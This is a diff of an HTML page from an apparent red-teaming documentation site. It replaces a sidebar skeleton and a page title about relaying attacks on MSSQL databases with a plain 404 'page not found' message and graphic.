+                        <svg xmlns="http://www.w3.org/2000/svg" class="mx-auto mb-6" style="max-width: 313px" fill="currentColor" viewBox="0 0 313 164"><path d="M156.17 0c-22.28 0-48.83 10.93-48.83 63.03 0 52.36 26.55 63.35 48.83 63.35 22.28 0 48.83-10.99 48.83-63.35C205 10.93 178.45 0 156.17 0zm0 118.38c-27.47 0-40.83-18.1-40.83-55.35C115.35 26 128.7 8 156.17 8 183.65 8 197 26 197 63.03c0 37.24-13.35 55.35-40.83 55.35z"/><path d="M156.17 25.53c-22.03 0-22.03 24.4-22.03 37.5 0 13.22 0 37.82 22.03 37.82s22.03-24.6 22.03-37.82c0-13.11 0-37.5-22.03-37.5zm0 67.32c-10.49 0-14.03-7.53-14.03-29.82 0-21.78 3.67-29.5 14.03-29.5s14.03 7.72 14.03 29.5c0 22.3-3.54 29.82-14.03 29.82zM58.05 37.48a5.95 5.95 0 00-6.73 2.44l-20.51 31a5.986 5.986 0 00-.28 6.15 5.992 5.992 0 005.29 3.16h20.5c3.31 0 6-2.69 6-6v-31a5.95 5.95 0 00-4.27-5.75zm-3.72 34.75H39.54l14.78-22.35v22.35z"/><path d="M93.95 72.23h-6.8v-63c0-3.31-2.69-6-6-6H54.37c-1.96 0-3.8.96-4.92 2.56L1.08 74.98A5.946 5.946 0 000 78.42v18.91c0 3.31 2.69 6 6 6h46.45v14.29c0 3.31 2.69 6 6 6h22.69c3.31 0 6-2.69 6-6v-14.29h6.8c3.31 0 6-2.69 6-6v-19.1c.01-3.31-2.68-6-5.99-6zm-2 23.1h-6.8c-3.31 0-6 2.69-6 6v14.29h-18.7v-14.29c0-3.31-2.69-6-6-6H8V79.05l47.41-67.82h23.73v63c0 3.31 2.69 6 6 6h6.8v15.1zM306.95 72.23h-6.8v-63c0-3.31-2.69-6-6-6h-26.77c-1.96 0-3.8.96-4.92 2.56l-48.37 69.19a5.946 5.946 0 00-1.08 3.44v18.91c0 3.31 2.69 6 6 6h46.45v14.29c0 3.31 2.69 6 6 6h22.69c3.31 0 6-2.69 6-6v-14.29h6.8c3.31 0 6-2.69 6-6v-19.1c0-3.31-2.69-6-6-6zm-2 23.1h-6.8c-3.31 0-6 2.69-6 6v14.29h-18.69v-14.29c0-3.31-2.69-6-6-6H221V79.05l47.41-67.82h23.73v63c0 3.31 2.69 6 6 6h6.8v15.1z"/><path d="M271.05 37.48a5.95 5.95 0 00-6.73 2.44l-20.51 31a5.986 5.986 0 00-.28 6.15 5.992 5.992 0 005.29 3.16h20.5c3.31 0 6-2.69 6-6v-31a5.95 5.95 0 00-4.27-5.75zm-3.72 34.75h-14.78l14.78-22.35v22.35z"/><g><ellipse cx="158.97" cy="158.2" rx="36.9" ry="5.95"/></g></svg>
                     </div>
-                
-                    <!-- Rendered if sidebar right is enabled -->
-                    <!-- Sidebar right skeleton-->
-                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
-                        <div class="pl-5">
-                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
-                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
-                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
-                        </div>
-                    </div>
-                
-                    <!-- User should be able to hide sidebar right -->
-                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                    <h1 class="mb-6 text-2xl font-bold leading-tight text-gray-900 dark:text-white md:text-4xl">Oops! The page you’re looking for doesn’t exist.</h1>
+                    <p class="mb-10 text-gray-600 dark:text-dark-350 md:text-lg md:px-4">You may have mistyped the address or the page may have been moved.</p>
+                    <a href="/Red-Teaming-Army/" class="inline-flex items-center justify-center h-12 px-4 text-sm leading-none text-button-primary-text bg-button-primary rounded shadow-xl focus:outline-none hover:bg-button-primary-hover transition-all duration-100 ease-linear">Go to homepage</a>
                 </div>
 
             </div>
@@ -701,6 +328,6 @@ If you want to select only the <code v-pre>ComputerName</code> field, you can us
 
     <div id="retype-overlay-target"></div>
 
-    <script data-cfasync="false">window.__DOCS__ = { "title": "Compromising MSSQL Databases by Relaying", level: 2, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+    <script data-cfasync="false">window.__DOCS__ = null</script>
 </body>
 </html>
